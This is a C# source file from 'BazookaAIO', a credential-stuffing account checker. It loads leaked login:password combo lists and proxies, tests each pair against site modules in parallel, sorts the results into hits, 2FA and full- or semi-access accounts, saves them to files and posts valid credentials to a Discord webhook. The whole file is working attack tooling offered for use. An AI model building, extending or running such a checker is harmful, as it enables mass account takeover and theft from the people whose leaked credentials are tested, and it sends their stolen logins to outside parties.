using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;

namespace Blaschuko_AIO
{
    class Check
    {
        public static IEnumerable<string> comboList;
        public static List<string> remainingLines = new List<string>();
        public static IEnumerable<string> proxies;
        public static int comboListLength;
        public static int proxyListLength;

        public static int checkeds = 0;
        public static int checkeds_but_cooler_name = 0;
        public static int hits = 0;
        public static int errors = 0;
        public static int bads = 0;
        public static int cpm = 0;
        public static bool showFails = false;
        public static bool running = false;
        public static int frees = 0;
        public static Color Goods_ = Color.Green;
        public static Color Bads_ = Color.Red;
        public static Color Frees_ = Color.Yellow;
        public static Color MainColor = Color.BlueViolet;




        static int[] cpmList = new int[60];

        public static List<string> pickedModules = new List<string>();

        public static void LoadCombolistAndProxies()
        {
            comboList = Utils.GetCombo();
            remainingLines = comboList.ToList();
            comboListLength = comboList.Count();
            if (Config.useProxies)
            {
                proxies = Utils.GetProxies();
                proxyListLength = proxies.Count();
            }
        }

        public static void Start()
        {
            running = true;
            dWebHook webhook = new dWebHook();
            new Thread(UpdateTitleAndCPM).Start();

            ThreadPool.SetMinThreads(Config.threads, Config.threads);
            ParallelOptions po = new ParallelOptions() { MaxDegreeOfParallelism = Config.threads };

            Parallel.ForEach(comboList, po, combo =>
            {
                if (!combo.Contains(':'))
                {
                    checkeds++;
                    return;
                }
                string[] arr = combo.Split(':');
                string login = arr[0];
                string password = arr[1];

                foreach (string module in pickedModules)
                {
                    string result = Modules.functions[module](login, password);
                    if (result == "Free")
                    {
                        if (Config.use_console)
                        { 
                        Colorful.Console.WriteLine("[/] " + module + " - " + combo, Frees_);
                        }
                        Results(combo + " - " + result, "Free", module);
                        checkeds++;
                        frees++;
                    }
                    else if (result == "2FA")
                    {
                        if (Config.use_console)
                        {
                        Colorful.Console.WriteLine("[/] " + module + " - " + combo, Frees_);
                        }
                        Results(combo + " - " + result, "2FA", module);
                        checkeds++;
                        frees++;
                    }
                    else if (result == "Bad")
                    {

                        if (showFails && Config.use_console)
                        {
                            Colorful.Console.WriteLine("[-] " + module + " - " + combo, Bads_);
                        }
                        bads++;
                        checkeds++;
                    }
                    else if (result == "NFA")
                    {
                        hits++;
                        if (Config.use_console)
                        {
                        Colorful.Console.WriteLine("[+] " + module + " - " + combo + " | " + result, Goods_);
                        }
                        Results(combo + " - " + result, "NFA", module);
                        checkeds++;
                        if (Config.SendDiscord)
                        {
                            webhook.SendMessage("[+] " + module + " - " + combo + " | " + result);
                        }
                    }
                    else if (result == "SFA")
                    {
                        hits++;
                        if (Config.use_console)
                        {
                        Colorful.Console.WriteLine("[+] " + module + " - " + combo + " | " + result, Goods_);
                        }
                        Results(combo + " - " + result, "SFA", module);
                        checkeds++;
                        if (Config.SendDiscord)
                        {
                            webhook.SendMessage("[+] " + module + " - " + combo + " | " + result);
                        }
                    } else if (result.Contains("MD5"))
                    {
                        result = result.Replace("MD5", "");
                        hits++;
                        if (Config.use_console)
                        {
                        Colorful.Console.WriteLine("[+] " + module + " | " + result, Goods_);
                        }
                        Results(result, "Dehashed", module);
                        checkeds++;
                    } else if(result == "Hit")
                    {
                        hits++;
                        if (Config.use_console)
                        {
                            Colorful.Console.WriteLine("[+] " + module + " - " + combo + " | " + result, Goods_);
                        }
                        Results(combo, "Hits", module);
                        checkeds++;
                        if (Config.SendDiscord)
                        {
                            webhook.SendMessage("[+] " + module + " | " + result);
                        }
                    }
                    else if (result != "")
                    {
                        hits++;
                        if (Config.use_console)
                        {
                        Colorful.Console.WriteLine("[+] " + module + " - " + combo + " | " + result, Goods_);
                        }
                        Results(combo + " - " + result, "Hits", module);
                        checkeds++;
                        if (Config.SendDiscord)
                        {
                            webhook.SendMessage("[+] " + module + " - " + combo + " | " + result);
                        }
                    }
                    

                    remainingLines.Remove(combo);
                }
                    checkeds_but_cooler_name++;
            });
        }

        public static string public_modules_list = "None";

        static void UpdateTitleAndCPM()
        {
            string mod_list = " "; 
            foreach (string item in pickedModules)
            {
                mod_list += $"{item} | ";
            }
            string s2 = mod_list.Substring(0, mod_list.Length - 3);
            s2 += " ";
            public_modules_list = s2;
            if (Config.use_console)
            {
                while (checkeds < comboListLength)
                {
                    Console.Title = $"BazookaAIO V2.1 [{s2}] - {checkeds_but_cooler_name}/{comboListLength} | Hits: {hits} - Invalids: {bads} - Errors: {errors} - CPM: {cpm} | Made by Freeload24 and Blaschuko";

                    CalculateCPM();

                    Thread.Sleep(1000);
                }
            }
            else
            {
                new Thread(UpdateConsole).Start();
                while (checkeds < comboListLength)
                {
                    Console.Title = $"BazookaAIO V2.2 [{s2}] - {checkeds_but_cooler_name}/{comboListLength} | Made by Freeload24 and Blaschuko";

                    CalculateCPM();

                    Thread.Sleep(1000);
                }
            }



            running = false;
            Console.Title = $"BazookaAIO V2.2 - {checkeds}/{comboListLength} | Hits: {hits} - Finished - Made by Freeload24 and Blaschuko";
        }

        static int previousCheckeds = 0;
        static int cpmI = 0;
        static void CalculateCPM()
        {
            cpmList[cpmI%60] = (checkeds - previousCheckeds);

            previousCheckeds = checkeds;
            cpm = cpmList.Sum();

            cpmI++;
        }

        public static void UpdateConsole()
        {
            while (checkeds < comboListLength)
            {
                Console.Clear();
                PrintLogo();
                Console.WriteLine();
                string m = public_modules_list.Replace(" | ", ", ");
                Colorful.Console.Write("Modules:", MainColor);
                Console.WriteLine(m + "\n");
                Colorful.Console.Write("    [+] Hits: ", MainColor);
                Colorful.Console.WriteLine(hits.ToString(), Goods_);
                Colorful.Console.Write("    [/] Frees: ", MainColor);
                Colorful.Console.WriteLine(frees.ToString(), Color.Orange);
                Colorful.Console.Write("    [-] Invalids: ", MainColor);
                Colorful.Console.WriteLine(bads.ToString() + "\n", Bads_);
                Colorful.Console.Write("    [x] Errors: ", MainColor);
                Console.WriteLine(errors.ToString());
                Colorful.Console.Write("    [*] CPM: ", MainColor);
                Console.WriteLine(cpm.ToString());
                Thread.Sleep(3000);
            }
        }
        public static string getProxy()
        {
            return Check.proxies.ElementAt(new Random().Next(0, Check.proxyListLength)); ;
        }

        public static readonly string day = DateTime.Now.ToString("hh - MMM dd, yyyy");
        public static string fileResult = "./Results/" + day + "/";
        public static void Results(string text, string file, string module)
        {
            while (true)
            {
                try
                {
                    Directory.CreateDirectory(fileResult + module + "/");
                    using (var streamWriter = new StreamWriter(fileResult + module + "/" + file + ".txt", true))
                    {
                        streamWriter.WriteLine(text);
                    }

                    break;
                }
                catch
                {
                    Thread.Sleep(100);
                }
            }
        }

        public static string[] sentences = {"Is that ur mom?", "thick", "BazookaAIO is shit lol", "Blas was here", "dou", "Installing rootkit...", "gay is not gay without g", "u lookin cute", "WtF yOu DoN't HaVe MiNeCrAfT", "10/11 rats installed", "Get Out Of My Room I’m playing Minecraft", "You know the rules, and so do I!", "Do I need an Openbullet config for this?", "Successfully sent your IP to the FBI", "How many threads should I use? Are 1500 enough?", "lol what a shitty combo", "Behind you", "is that ur dick?", "15 cpm lol do u even have proxies?", "you weren't supposed to see that...", "uploading your files to the Bazooka server...", "Encrypting files", "Your BazookaAIO license ended, please buy one again.", "Ur webcam is on", "I like chickens", "Where is your dick", "X-risky best checker", "injecting rat", "get stick bugged LOL", "Starting BTC miner...", "Only for educational purposes", "Activating Remote Desktop Protocol in your computer...", "Deleting files...", "Successfully changed process name of keylogger.exe", "60 cpm you should buy some proxys", "You were not a beta tester lol", "If u read this u gay", "Discord Token received", "Stealing bank details", "nice passwords you got there", "don't be gay, that's gay", "adding you to our botnet",  };
        public static Random rand = new Random();



        public static void PrintLogo()
        {
            Console.WriteLine("");
            int index = rand.Next(sentences.Length);
            //Colorful.Console.WriteLine(@"   _______________________    _____________________ ", Color.BlueViolet);
            //Colorful.Console.WriteLine(@"   ___  __/__  __ \_  ___/    ___    |___  _/_  __ \", Color.BlueViolet);
            //Colorful.Console.WriteLine(@"   __  /  __  /_/ /____ \     __  /| |__  / _  / / /    Blaschuko#6265", Color.BlueViolet);
            //Colorful.Console.WriteLine(@"   _  /   _  ____/____/ /     _  ___ |_/ /  / /_/ /     Freeload24#0001", Color.BlueViolet);
            //Colorful.Console.WriteLine(@"   /_/    /_/     /____/      /_/  |_/___/  \____/  ", Color.BlueViolet);

            Colorful.Console.WriteLine(@"  ____                       _            _    ___ ___   __     ______  ", MainColor);
            Colorful.Console.WriteLine(@" | __ )  __ _ _______   ___ | | ____ _   / \  |_ _/ _ \  \ \   / /___ \ ", MainColor);
            Colorful.Console.WriteLine(@" |  _ \ / _` |_  / _ \ / _ \| |/ / _` | / _ \  | | | | |  \ \ / /  __) |    Blaschuko#6265", MainColor);
            Colorful.Console.WriteLine(@" | |_) | (_| |/ / (_) | (_) |   < (_| |/ ___ \ | | |_| |   \ V /  / __/     Freeload#0001", MainColor);
            Colorful.Console.WriteLine(@" |____/ \__,_/___\___/ \___/|_|\_\__,_/_/   \_\___\___/     \_/  |_____|", MainColor);
            Colorful.Console.WriteLine($"\n    - \"{sentences[index]}\" ", MainColor);

            //Colorful.Console.WriteLine(@"                                                                        ", Color.BlueViolet);
            //Colorful.Console.WriteLine(@"                                                                        ", Color.BlueViolet);
            //Colorful.Console.WriteLine(@"                                                   Bazooka                                     ", Color.BlueViolet);
            //Colorful.Console.WriteLine(@"                                                                         ", Color.BlueViolet);
            //Colorful.Console.WriteLine(@"                                                                        ", Color.BlueViolet);


            Console.WriteLine("");

        }



    }
}
